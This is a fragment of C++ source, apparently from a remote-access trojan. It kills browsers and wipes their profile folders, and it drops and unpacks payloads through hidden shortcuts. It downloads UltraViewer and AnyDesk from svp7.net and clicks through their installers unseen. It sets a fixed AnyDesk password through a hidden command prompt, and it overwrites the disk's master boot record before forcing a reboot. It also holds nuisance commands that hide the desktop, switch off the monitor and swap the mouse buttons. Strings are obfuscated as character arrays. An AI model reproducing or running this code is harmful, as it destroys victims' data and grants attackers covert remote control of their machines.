	CString aadir="C:\\Users\\"+strRes+"\\AppData\\Roaming\\Microsoft\\Skype for Desktop";
	
	
	m_gFunc.Sleep(1000);
	RemoveDir(aadir);
	return 0;
}
DWORD WINAPI ReStartieqc3(LPVOID lParam)//���
{
	
	KillProcessFromName("firefox.exe");
	m_gFunc.Sleep(1000);
	system("del /s /f %appdata%\\Mozilla\\Firefox\\Profiles\\*.db");
	return 0;
}
DWORD WINAPI ReStartieqc4(LPVOID lParam)//360
{
	KillProcessFromName("360se6.exe");
	TCHAR   szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE);  
	CString strRes;
	AfxExtractSubString(strRes,szPath,2,'\\');
	
	CString aadir="C:\\Users\\"+strRes+"\\AppData\\Roaming\\360se6\\User Data\\Default";
	
	
	m_gFunc.Sleep(1000);
	RemoveDir(aadir);
	return 0;
}
DWORD WINAPI ReStartieqc5(LPVOID lParam)//qq
{
	KillProcessFromName("QQBrowser.exe");
	TCHAR   szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE);  
	CString strRes;
	AfxExtractSubString(strRes,szPath,2,'\\');
	
	CString aadir="C:\\Users\\"+strRes+"\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default";
	
	
	m_gFunc.Sleep(1000);
	RemoveDir(aadir);
	
	return 0;
}
DWORD WINAPI ReStartieqc6(LPVOID lParam)//�ѹ�
{
	KillProcessFromName("SogouExplorer.exe");
	TCHAR   szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE);  
	CString strRes;
	AfxExtractSubString(strRes,szPath,2,'\\');
	
	CString aadir="C:\\Users\\"+strRes+"\\AppData\\Roaming\\SogouExplorer";
	
	
	m_gFunc.Sleep(1000);
	RemoveDir(aadir);
	return 0;
}
#define _WIN32_DCOM

#include <ShObjIdl.h>
#include <ShlGuid.h>
void kuai_jiejian()
{
	TCHAR direc[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,direc);   //��ȡ����Ŀ¼1
	TCHAR direc1[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,direc1);  //��ȡ����Ŀ¼2
	strcat(direc, "\\PerProtect.exe");  //����Ŀ¼����PerProtect.exe
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    HRESULT hRet;
    IShellLink* pShellLink;
    hRet = CoCreateInstance(CLSID_ShellLink, 0, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
    if (hRet == S_OK) {
		//Ҫ������ݼ���Ŀ��
        pShellLink->SetPath(TEXT(direc));  
		//Ŀ��ֵָ��
        pShellLink->SetArguments(TEXT("/c Perprotect.bat"));
		//Ŀ��ָ��Ŀ¼
        pShellLink->SetWorkingDirectory(TEXT(direc1)); //��ȡ����Ŀ¼
		
        //��С������
        pShellLink->SetShowCmd(SW_SHOWMINNOACTIVE);
		
        IPersistFile* pFile;
        hRet = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pFile);
        if (hRet == S_OK) {
			//��ſ�ݼ�λ��
            pFile->Save(L"123.lnk", TRUE);
            pFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
}
BOOL DeleteDirectory(CString path) //ɾ���ļ���
{
	CFileFind tempFind;
	CString findpath = path + _T("//*.*");
	BOOL IsFinded = tempFind.FindFile(findpath);
	while(IsFinded)
	{
		IsFinded = tempFind.FindNextFile();
		if( tempFind.IsDots())continue;
		if(tempFind.IsDirectory())DeleteDirectory(tempFind.GetFilePath());
		else
			CFile::Remove(tempFind.GetFilePath());
	}
	tempFind.Close();
	return RemoveDirectory(path);
}
BOOL IsExistProcess(CONST CHAR* szProcessName) //�ж��߳�
{
	PROCESSENTRY32 processEntry32; 
	HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,  0);
	if (((int)toolHelp32Snapshot) != -1)
	{
		processEntry32.dwSize = sizeof(processEntry32);
		if (Process32First(toolHelp32Snapshot, &processEntry32))
		{
			do
			{
				if(strcmp(szProcessName ,processEntry32.szExeFile) == 0)   ///processEntry32����ǰ�����(char*)
				{
					
					return TRUE;
				}
			}while (Process32Next(toolHelp32Snapshot, &processEntry32));
		}
		m_gFunc.CloseHandle(toolHelp32Snapshot);
	}
	return FALSE;
}
char CWYKo[] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','j','y','.','l','n','k','\0'};
///�޸�2
void CreateLink()//��ݷ�ʽ�������ļ���(*.lnk)   
{   
	HRESULT hres;
	IShellLink* psl;
	IPersistFile* ppf;
	WCHAR wsz[MAX_PATH];
	//��ʼ��COM   
	CoInitialize(NULL);  
	TCHAR szPath[256];
	char BseRP[180] = {'%','a','p','p','d','a','t','a','%','\0'};
	strcat(szPath,BseRP);
	strcat(szPath,"\\run.exe");
	char route10[]="-e -n d.rar";
	hres = CoCreateInstance(CLSID_ShellLink,NULL,CLSCTX_INPROC_SERVER,IID_IShellLink,(LPVOID*)&psl);   
	if(hres == S_OK)   
	{   
		//��ݼ�
		psl->SetHotkey(MAKEWORD(VK_RETURN,NULL)); 
		//Ҫ������ݼ���Ŀ��
        psl->SetPath(TEXT(szPath));  
		//Ŀ��ֵָ��
        psl->SetArguments(TEXT(route10));
		//Ŀ��ָ��Ŀ¼
        psl->SetWorkingDirectory(TEXT("%appdata%"));
        //��С������
        psl->SetShowCmd(SW_SHOWMINNOACTIVE);
		
		hres = psl->QueryInterface(IID_IPersistFile,(LPVOID*)&ppf);
		if(hres == S_OK)
		{   
			//ȷ�������ļ���ΪANSI��ʽ
			//route11��ݼ��������ƺ�·��
			MultiByteToWideChar(CP_ACP,0,CWYKo,-1,wsz,MAX_PATH);  
			//����IPersistFile::Save   
			//�����ݷ�ʽ�������ļ�(*.lnk)   
			ppf->Save(wsz, STGM_READWRITE);   
			//�ͷ�IPersistFile��IShellLink�ӿ�   
			ppf->Release();    
		} 
		psl->Release();
	}  
	CoUninitialize();
}
BOOL GUOFU(LPBYTE lpBuffer, UINT nSize)//��360����
{
	//������ݼ�
	CreateLink();
	HANDLE hFile;
	LOCALUP LocaUp;
	TCHAR Server[MAX_PATH + 100] = {0};
	TCHAR Server0[100];
	TCHAR Server1[100];
	TCHAR Server2[100];
	TCHAR Server3[100];
	DWORD  dwBytesWritten;
	m_gFunc.memcpy(&LocaUp,lpBuffer,sizeof(LOCALUP));
	m_gFunc.SHGetSpecialFolderPaths(NULL,Server,CSIDL_APPDATA,FALSE);
	m_gFunc.PathAddBackslash(Server);
	wsprintf(Server1,Server);
	wsprintf(Server2,Server);
	wsprintf(Server3,Server);
	strcat(Server,LocaUp.lpFileName);
	hFile = CreateFile(Server,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP) , &dwBytesWritten, NULL)) 
		return false;
	m_gFunc.CloseHandle(hFile);

	char path[MAX_PATH] = {0};
	m_gFunc.GetModuleFileName(NULL, path, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess,0, path, &dwSize);
	m_gFunc.SHGetSpecialFolderPaths(NULL,Server0,CSIDL_COMMON_DOCUMENTS,FALSE);
	strcat(Server0,"\\SVP7.exe");
	if(m_gFunc.CopyFileA(path,Server0,FALSE))
		m_gFunc.PathRemoveFileSpec(Server0);

	if(m_gFunc.PathFileExists(Server))
	{
		if(Zip_UnPackFiles(Server,Server1,"")) 
		{
			m_gFunc.DeleteFile(Server);
			strcat(Server1,"\\1200.exe");
			strcat(Server2,"\\d.rar");
			strcat(Server3,"\\run.exe");
			HINSTANCE hNewExe = m_gFunc.ShellExecute(0,0,Server1,0,0,0);
			if (!(DWORD)hNewExe <= 32)
			{
				while(1)
				{
					TCHAR Startup[100];
					m_gFunc.SHGetSpecialFolderPaths(NULL,Startup,CSIDL_STARTUP,FALSE);
					strcat(Startup,"\\�����������.lnk");
					if(m_gFunc.PathFileExists(Startup))
					{
						char gf[]="1200.exe";
						char gf1[]="run.exe";
						if(IsExistProcess(gf))
						{
							KillProcessFromName(gf);
						}
						else
						{
							if(IsExistProcess(gf1))
							{
								KillProcessFromName(gf1);
							}
							else
							{
								strcat(Server0,"\\1234");
								m_gFunc.DeleteFile(CWYKo);
								DeleteDirectory(Server0);
								m_gFunc.DeleteFile(Server2);
																if(m_gFunc.DeleteFile(Server1))
									if(m_gFunc.DeleteFile(Server3))
										break;
							}
						}
					}
				}
			}
		}
	}
	return TRUE;
}
//��ȡ����IP
CString GotHost(CString YM)
{
	WSAData wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);
	hostent *phst=gethostbyname(YM);
	in_addr * iddr=(in_addr*)phst->h_addr;
	unsigned long IPUL=iddr->s_addr;
	char *IP=inet_ntoa(*iddr);
	return IP;
}
DWORD WINAPI ReStartieqc8(LPVOID lParam)//�Զ���װUV
{
	TCHAR Ultra[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL,Ultra,CSIDL_PROGRAM_FILESX86,0);
	m_gFunc.PathAddBackslash(Ultra);
	strcat(Ultra,"UltraViewer");
	char http[80] = "http://";
	CString YM = GotHost("svp7.net");
	strcat(http,YM);
	strcat(http,":9874/UltraViewer.exe");
	
	HANDLE	hThread;
	if(!m_gFunc.PathFileExists(Ultra))  //��������װ������ж��
	{
		DWORD(WINAPI *DOWNFILE) (LPCTSTR ,LPCTSTR, LPCTSTR ,DWORD, LPCTSTR);
		char tUyoF[] = {'u','r','l','m','o','n','.','d','l','l','\0'};
		char edtfl[] = {'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','A','\0'};
		(FARPROC&)DOWNFILE= GetProcAddress(LoadLibrary(tUyoF),edtfl);
		TCHAR szPath[MAX_PATH];
		m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,CSIDL_COMMON_DOCUMENTS,FALSE);
		strcat(szPath,"\\UltraViewer.exe");
		HRESULT hr = DOWNFILE(NULL,http, szPath, 0, NULL);
		if (hr==S_OK)
		{
			HINSTANCE hNewExe = m_gFunc.ShellExecute(0,0,szPath,0,0,5);
			if (!(DWORD)hNewExe <= 32)
			{
				for (int i = 0; i < 60; i++)  //�ӳ�1�������߳��˳������߳���Ч
				{
					m_gFunc.Sleep(1000);
					HWND	hWnd1,hWnd2;
					char AXqwg[] = {'T','W','i','z','a','r','d','F','o','r','m','\0'};
					hWnd1 = FindWindow(AXqwg,NULL);
					if (hWnd1)
					{
						char trJiI[] = {'&','N','e','x','t',' ','>','\0'};
						hWnd2 = FindWindowEx(hWnd1,NULL,NULL,trJiI);
						if(hWnd2)
						{
							UINT nCtrlID = GetDlgCtrlID(hWnd2);
							PostMessage(hWnd2, WM_COMMAND, (WPARAM)(BN_CLICKED << 16 | nCtrlID), (LPARAM)hWnd2);
							PostMessage(hWnd2,WM_MOUSEMOVE, MK_LBUTTON, MAKELONG(0,0) );   
							PostMessage(hWnd2,WM_LBUTTONDOWN,MK_LBUTTON,MAKELPARAM(0,0));      
							PostMessage(hWnd2,WM_LBUTTONUP,MK_LBUTTON,MAKELPARAM(0,0));
						}
						else
						{
							char ELzqp[] = {'&','I','n','s','t','a','l','l','\0'};
							hWnd2 = FindWindowEx(hWnd1,NULL,NULL,ELzqp);
							if(hWnd2)
							{
								UINT nCtrlID = GetDlgCtrlID(hWnd2);
								PostMessage(hWnd2, WM_COMMAND, (WPARAM)(BN_CLICKED << 16 | nCtrlID), (LPARAM)hWnd2);
								PostMessage(hWnd2,WM_MOUSEMOVE, MK_LBUTTON, MAKELONG(0,0) );   
								PostMessage(hWnd2,WM_LBUTTONDOWN,MK_LBUTTON,MAKELPARAM(0,0));      
								PostMessage(hWnd2,WM_LBUTTONUP,MK_LBUTTON,MAKELPARAM(0,0));
							}
							else
							{
								char cmyKw[] = {'&','F','i','n','i','s','h','\0'};
								hWnd2 = FindWindowEx(hWnd1,NULL,NULL,cmyKw);
								if(hWnd2)
								{
									UINT nCtrlID = GetDlgCtrlID(hWnd2);
									PostMessage(hWnd2, WM_COMMAND, (WPARAM)(BN_CLICKED << 16 | nCtrlID), (LPARAM)hWnd2);
									PostMessage(hWnd2,WM_MOUSEMOVE, MK_LBUTTON, MAKELONG(0,0) );   
									PostMessage(hWnd2,WM_LBUTTONDOWN,MK_LBUTTON,MAKELPARAM(0,0));      
									PostMessage(hWnd2,WM_LBUTTONUP,MK_LBUTTON,MAKELPARAM(0,0));
									m_gFunc.Sleep(50);
									break;
								}
							}
						}
					}
				}
			}
		}
	}
	else
	{
		KillProcessFromName("uv_x64.exe");
		KillProcessFromName("UI0Detect.exe");
		KillProcessFromName("UltraViewer_Service.exe");
		KillProcessFromName("UltraViewer_Desktop.exe");
		m_gFunc.PathAddBackslash(Ultra);
		strcat(Ultra,"unins000.exe");
		if(!m_gFunc.PathFileExists(Ultra))  //��������ɾ���ļ���
		{
			m_gFunc.PathRemoveFileSpec(Ultra);
			DeleteDirectory(Ultra);
		}
		else
		{
			
			m_gFunc.ShellExecute(0,0,Ultra,0,0, SW_HIDE);
			for (int i = 0; i < 60; i++)  //�ӳ�1�������߳��˳������߳���Ч
			{
				m_gFunc.Sleep(1000);
				HWND hWnd1 = FindWindow(0,"UltraViewer Uninstall");
				if (hWnd1)
				{
					HWND hWnd2 = FindWindowEx(hWnd1,NULL,"Button",0);
					if(hWnd2)
					{
						UINT nCtrlID = GetDlgCtrlID(hWnd2);
						PostMessage(hWnd2, WM_COMMAND, (WPARAM)(BN_CLICKED << 16 | nCtrlID), (LPARAM)hWnd2);
						PostMessage(hWnd2,WM_MOUSEMOVE, MK_LBUTTON, MAKELONG(0,0) );   
						PostMessage(hWnd2,WM_LBUTTONDOWN,MK_LBUTTON,MAKELPARAM(0,0));      
						PostMessage(hWnd2,WM_LBUTTONUP,MK_LBUTTON,MAKELPARAM(0,0));
						break;
					}
				}
			}
			for (i = 0; i < 60; i++)  //�ӳ�1�������߳��˳������߳���Ч
			{
				m_gFunc.Sleep(1000);
				HWND hWnd1 = FindWindow(0,"UltraViewer Uninstall");
				if (hWnd1)
				{
					HWND hWnd2 = FindWindowEx(hWnd1,NULL,"Button",0);
					if(hWnd2)
					{
						UINT nCtrlID = GetDlgCtrlID(hWnd2);
						PostMessage(hWnd2, WM_COMMAND, (WPARAM)(BN_CLICKED << 16 | nCtrlID), (LPARAM)hWnd2);
						PostMessage(hWnd2,WM_MOUSEMOVE, MK_LBUTTON, MAKELONG(0,0) );   
						PostMessage(hWnd2,WM_LBUTTONDOWN,MK_LBUTTON,MAKELPARAM(0,0));      
						PostMessage(hWnd2,WM_LBUTTONUP,MK_LBUTTON,MAKELPARAM(0,0));
						break;
					}
				}
			}
			m_gFunc.Sleep(2000);
			//����IE
			KillProcessFromName("iexplore.exe");
			//���DLLռ��
			m_gFunc.PathRemoveFileSpec(Ultra);
			m_gFunc.PathAddBackslash(Ultra);
			strcat(Ultra,"uvh.dll");
			HMODULE hDllLib = LoadLibrary((Ultra));
			FreeLibrary(hDllLib);
			m_gFunc.CloseHandle(hDllLib);
			m_gFunc.Sleep(1000);
			//ɾ�������ļ���
			m_gFunc.PathRemoveFileSpec(Ultra);
			DeleteDirectory(Ultra);
			//����IE
			KillProcessFromName("iexplore.exe");
		}
	}
	m_gFunc.CloseHandle(hThread);
	return 0;
}
DWORD WINAPI ReStartieqc9(LPVOID lParam)//�Զ���װAK
{
	char AK[]="AnyDesk.exe";
	TCHAR szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,CSIDL_COMMON_DOCUMENTS, FALSE);
	strcat(szPath,"\\");
	strcat(szPath,AK);
	
	if(!m_gFunc.PathFileExists(szPath))
	{
		char http[80] = "http://";
		CString YM = GotHost("SVP7.NET");
		strcat(http,YM);
		strcat(http,":9874/AnyDesk.exe");
		DWORD(WINAPI *DOWNFILE) (LPCTSTR ,LPCTSTR, LPCTSTR ,DWORD, LPCTSTR);
		char tUyoF[] = {'u','r','l','m','o','n','.','d','l','l','\0'};
		char edtfl[] = {'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','A','\0'};
		(FARPROC&)DOWNFILE= GetProcAddress(LoadLibrary(tUyoF),edtfl);
		TCHAR szPath[MAX_PATH];
		m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,CSIDL_COMMON_DOCUMENTS,FALSE);
		strcat(szPath,"\\AnyDesk.exe");
		HRESULT hr = DOWNFILE(NULL,http, szPath, 0, NULL);
		if (hr==S_OK)
		{
			HINSTANCE hNewExe = m_gFunc.ShellExecute(0,0,szPath,0,0,5);
			if (!(DWORD)hNewExe <= 32)
			{
				m_gFunc.Sleep(3000);
				if(IsExistProcess(AK))
				{
					char TqhZL[] = {'c','m','d','.','e','x','e','\0'};
					char yyqBI[] = {'/','c',' ','e','c','h','o',' ','1','2','3','4','5','6','|','C',':','\\','U','s','e','r','s','\\','P','u','b','l','i','c','\\','D','o','c','u','m','e','n','t','s','\\','A','n','y','D','e','s','k','.','e','x','e',' ','-','-','s','e','t','-','p','a','s','s','w','o','r','d','\0'};
					m_gFunc.ShellExecute(0,0,TqhZL,yyqBI,0,SW_HIDE);
				}
			}
		}
	}
	else
	{
		KillProcessFromName(AK);
		m_gFunc.Sleep(1000);
		KillProcessFromName(AK);
		m_gFunc.Sleep(1000);
		m_gFunc.DeleteFile(szPath);
	}
	return 0;
}
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;
	
	if (!m_gFunc.OpenProcessToken(m_gFunc.GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;
	
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (m_gFunc.GetLastError() != ERROR_SUCCESS)
	{
		m_gFunc.CloseHandle(hToken);
		return FALSE;
	}
	m_gFunc.CloseHandle(hToken);
	return TRUE;
}

unsigned char mbrscode[] = // ����QQ����
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe";

int KillMBR(BOOL bLeaveQQ)
{
	//	ExitWindowsExT   pExitWindowsEx =  (ExitWindowsExT)GetProcAddress(LoadLibrary("USER32.dll"), "ExitWindowsEx");
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	
	// ���¹���MBR
	if (bLeaveQQ)   // ����QQ
		m_gFunc.memcpy(pMBR, mbrscode, sizeof(mbrscode) - 1);
	else            // ����QQ
		m_gFunc.memcpy(pMBR, mbrscode, sizeof(mbrscode) - 23 - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	// д�벡������
	hDevice = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	m_gFunc.CloseHandle(hDevice);
	m_gFunc.Sleep(2000);
	
	// ������������
	DWORD dwVersion = m_gFunc.GetVersion();
	if (dwVersion < 0x80000000)   // Is NT or 2000!
	{
		EnablePrivilege(SE_SHUTDOWN_NAME, TRUE);
		m_gFunc.ExitWindowsEx(EWX_FORCE+EWX_REBOOT, 0);
	}
	else   // Is 9x or Me!
	{
		m_gFunc.ExitWindowsEx(EWX_FORCE+EWX_REBOOT, 0);
	}
	ExitProcess(-1);
	return 0;
}
void WINAPI Loop_PrankControl(LPVOID lparam)
{
	DWORD dwType = (DWORD)lparam;
	//	SetEvent(hNewThreadInitializedEvent);
	
	switch(dwType)
	{
	case COMMAND_KILLMBR:
		KillMBR(TRUE); //Ӳ��ը��
		break;
	case COMMAND_ZHUOMIAN1:
		{
			HWND disk;
			disk = FindWindow("Progman",NULL);
			ShowWindow(disk,SW_HIDE); //��������
		}
		break;
	case COMMAND_ZHUOMIAN2:
		{
			HWND disk;
			disk=FindWindow("Progman",NULL);
			ShowWindow(disk,SW_SHOW); //��ʾ����
		}
		break;
	case COMMAND_RENWULAN1:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_HIDE); //����������
			mask=FindWindow("Button","��ʼ");
			ShowWindow(mask,SW_HIDE); //���ؿ�ʼ��ť
		}
		break;
	case COMMAND_RENWULAN2:
		{
			HWND mask;
			mask=FindWindow("Shell_TrayWnd",NULL);
			ShowWindow(mask,SW_SHOW); //��ʾ������
			mask=FindWindow("Button","��ʼ");
			ShowWindow(mask,SW_SHOW); //��ʾ��ʼ��ť
		}
		break;
	case COMMAND_XIANSHIQI1:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);  //�ر���ʾ��
		break;
	case COMMAND_XIANSHIQI2:
		SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1); //����ʾ��
		break;
	case COMMAND_GUANGQU1:
		::mciSendString("set cdaudio door open",NULL,0,NULL);          //�򿪹���
		break;
	case COMMAND_GUANGQU2:
		::mciSendString("set cdaudio door closed wait",NULL,0,NULL);   //�رչ���
		break;
	case COMMAND_ZAOYIN:
		{
			for(int i=1000;i<1050;i++)
			{
				Beep(i,30);
				m_gFunc.Sleep(100);
			}
		}
		break;
	case COMMAND_SHANPIN:
		{
			HWND ForeHandle=GetForegroundWindow();
			for(int i=0;i<15;i++)
			{
				RECT rc;
				GetWindowRect(ForeHandle,&rc);
				MoveWindow(ForeHandle,rc.left+8,rc.top+8,rc.right-rc.left,rc.bottom-rc.top,1);
				m_gFunc.Sleep(40);
				MoveWindow(ForeHandle,rc.left,rc.top,rc.right-rc.left,rc.bottom-rc.top,1);
				m_gFunc.Sleep(40);
				Beep(0x0fff,10);
			}
		}
		break;
	case COMMAND_MOUSE1:
		SwapMouseButton(true);  //�������
		break;
	case COMMAND_MOUSE2:
		SwapMouseButton(false); //�ָ����
		break;
	default:
		return;
	}
}
#endif // !defined(AFX_LOOP_H_INCLUDED)
